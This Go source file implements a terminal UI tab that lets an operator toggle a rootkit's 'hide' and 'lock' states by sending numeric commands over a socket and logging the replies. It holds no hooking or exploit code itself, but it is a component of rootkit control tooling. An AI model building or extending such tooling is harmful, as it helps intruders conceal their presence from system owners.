package model

import (
	"fmt"
	"strings"
	"time"

	"cli/server"
	"cli/style"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
)

type HideModel struct {
	srv       *server.Server
	locked    *bool
	isLoading *bool
	logs      *LogsModel
	isHidden  *bool
	isDoing   *bool
	width     int
	height    int
}

type (
	HideStartCmd int
	HideDoneCmd  int
	LockStartCmd int
	LockDoneCmd  int
)

const (
	HOOKS_DISABLED = '0'
	HOOKS_ENABLED  = '1'
)

func NewHideModel(cfg TabCfg, isHidden *bool) *HideModel {
	b := false
	h := HideModel{
		srv:       cfg.srv,
		locked:    cfg.locked,
		isLoading: cfg.isLoading,
		isDoing:   &b,
		logs:      cfg.logs,
		isHidden:  isHidden,
		width:     *cfg.width,
		height:    *cfg.height,
	}

	return &h
}

func (h HideModel) Init() tea.Cmd {
	return nil
}

func (h HideModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	var cmds []tea.Cmd
	switch msg := msg.(type) {
	case tea.KeyMsg:
		switch msg.String() {
		case "h":
			if !*h.isLoading && !*h.isDoing {
				cmds = append(cmds, tea.Sequence(h.startHideCmd, h.waitForHideResultCmd))
			} else {
				h.logs.Append("hide: another command is already running\n")
			}
		case "l":
			if !*h.isLoading && !*h.isDoing {
				cmds = append(cmds, tea.Sequence(h.startLockCmd, h.waitForLockResultCmd))
			} else {
				h.logs.Append("lock: another command is already running\n")
			}

		}
	case tea.WindowSizeMsg:
		h.width = msg.Width
		h.height = msg.Height
	}
	return h, tea.Batch(cmds...)
}

func (h HideModel) View() string {
	if h.srv.ConnState != server.Connected {
		return "Status: Unknown\n"
	}
	s := strings.Builder{}

	hideStatus := "🔴 Not Hidden"
	hideToggle := "Hide"
	if *h.isHidden {
		hideStatus = "🤫 Hidden"
		hideToggle = "reveal"
	}

	lockStatus := "🔓 Unlocked"
	lockToggle := "Lock"
	if *h.locked {
		lockStatus = "🔐 Locked"
		lockToggle = "Unlock"
	}

	a := lipgloss.NewStyle().
		Width(h.width - 4).
		Height(h.height - 4)

	italic := lipgloss.NewStyle().Italic(true).Foreground(style.Purple)

	s.WriteString(a.Render(
		lipgloss.Place(h.width-4, h.height-4, lipgloss.Center, lipgloss.Center,
			lipgloss.JoinVertical(lipgloss.Center,
				lipgloss.JoinVertical(lipgloss.Left,
					fmt.Sprintf("Lock status: %s", lockStatus),
					fmt.Sprintf("Hide Status: %s\n", hideStatus),
				),
				lipgloss.JoinVertical(lipgloss.Left,
					italic.Render("Press 'h' to", hideToggle),
					italic.Render("Press 'l' to", lockToggle),
				),
			),
		)))

	return s.String()
}

func (h HideModel) startHideCmd() tea.Msg {
	if *h.isLoading || h.srv.ConnState != server.Connected {
		h.logs.Append("Hide: not connected\n")
		return nil
	}

	conn := *h.srv.Sock
	_, err := fmt.Fprintf(conn, "2\n")
	if err != nil {
		return ConnectionUpdateMsg(server.Disconnected)
	}

	*h.isDoing = true
	*h.isLoading = true
	return HideStartCmd(1)
}

func (h *HideModel) waitForHideResultCmd() tea.Msg {
	if !*h.isDoing {
		return nil
	}
	ch := h.srv.Channel
	timer := time.NewTimer(10 * time.Second)
loop:
	for {
		select {
		case msg, ok := <-ch:
			if ok {
				l := msg[0]
				switch l {
				case HOOKS_DISABLED:
					*h.isHidden = false
				case HOOKS_ENABLED:
					*h.isHidden = true
				default:
					h.logs.Append(fmt.Sprintf("hide: couldn't determine hide status: %v\n", msg))
				}
			} else {
				h.logs.Append("hide not ok\n")
			}
			break loop
		case <-timer.C:
			h.logs.Append("hide timed out\n")
			break loop
		}
	}
	*h.isLoading = false
	*h.isDoing = false
	return HideDoneCmd(1)
}

func (h HideModel) startLockCmd() tea.Msg {
	if *h.isLoading || h.srv.ConnState != server.Connected {
		h.logs.Append("Lock: not connected\n")
		return nil
	}

	conn := *h.srv.Sock
	_, err := fmt.Fprintf(conn, "6\n")
	if err != nil {
		return ConnectionUpdateMsg(server.Disconnected)
	}

	*h.isDoing = true
	*h.isLoading = true
	return LockStartCmd(1)
}

func (h *HideModel) waitForLockResultCmd() tea.Msg {
	if !*h.isDoing {
		return nil
	}
	ch := h.srv.Channel
	timer := time.NewTimer(10 * time.Second)
loop:
	for {
		select {
		case msg, ok := <-ch:
			if ok {
				l := msg[0]
				switch l {
				case UNLOCKED:
					*h.locked = false
					h.logs.Append("lock: rootkit is unlocked! 🔓\n")
				case LOCKED:
					*h.locked = true
					h.logs.Append("lock: rootkit is locked 🔒\n")
				default:
					h.logs.Append("lock: couldn't determine lock status. locking..\n")
				}
			} else {
				h.logs.Append("lock not ok\n")
			}
			break loop
		case <-timer.C:
			h.logs.Append("lock timed out\n")
			break loop
		}
	}
	*h.isLoading = false
	*h.isDoing = false
	return LockDoneCmd(1)
}
